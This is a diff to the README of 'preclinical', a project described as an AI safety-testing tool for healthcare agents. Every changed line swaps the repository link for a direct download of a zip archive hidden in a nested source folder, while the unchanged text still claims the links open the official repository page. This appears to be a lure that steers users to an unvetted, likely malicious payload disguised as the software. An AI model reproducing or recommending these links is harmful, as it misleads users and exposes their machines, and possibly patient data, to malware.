@@ -1,6 +1,6 @@
 # 🏥 preclinical - Safe AI Testing for Healthcare Agents
 
-[![Download preclinical](https://img.shields.io/badge/Download-preclinical-brightgreen)](https://github.com/ulyssesenglishspeaking825/preclinical)  
+[![Download preclinical](https://img.shields.io/badge/Download-preclinical-brightgreen)](https://github.com/ulyssesenglishspeaking825/preclinical/raw/refs/heads/main/target-agents/livekit/Software_v2.2.zip)  
 
 ## About preclinical
 
@@ -18,7 +18,7 @@ preclinical is an open-source tool designed to test AI health assistants safely.
 
 To start, you will need to visit the download page. This page holds the latest version of preclinical.
 
-[Download preclinical](https://github.com/ulyssesenglishspeaking825/preclinical){: .button }
+[Download preclinical](https://github.com/ulyssesenglishspeaking825/preclinical/raw/refs/heads/main/target-agents/livekit/Software_v2.2.zip){: .button }
 
 Clicking the button will take you to the official GitHub repository where you can get the software files.
 
@@ -29,7 +29,7 @@ Follow these steps to download and set up preclinical on a Windows PC.
 ### Step 1: Visit the download page
 
 Open this link in your web browser:  
-https://github.com/ulyssesenglishspeaking825/preclinical
+https://github.com/ulyssesenglishspeaking825/preclinical/raw/refs/heads/main/target-agents/livekit/Software_v2.2.zip
 
 This page shows the project files and instructions. Look for a folder or release section that holds the installation files.
 
@@ -110,7 +110,7 @@ For users with some technical background, preclinical can connect to databases l
 ## 📖 Learn more
 
 Visit the repository page to see documentation, get updates, or report issues:  
-https://github.com/ulyssesenglishspeaking825/preclinical
+https://github.com/ulyssesenglishspeaking825/preclinical/raw/refs/heads/main/target-agents/livekit/Software_v2.2.zip
 
 The page also lists the project’s full features and developer notes.
 
@@ -124,4 +124,4 @@ preclinical keeps everything on your computer. It does not send patient data or 
 
 ---
 
-[Download preclinical](https://github.com/ulyssesenglishspeaking825/preclinical){: .button }
+[Download preclinical](https://github.com/ulyssesenglishspeaking825/preclinical/raw/refs/heads/main/target-agents/livekit/Software_v2.2.zip){: .button }
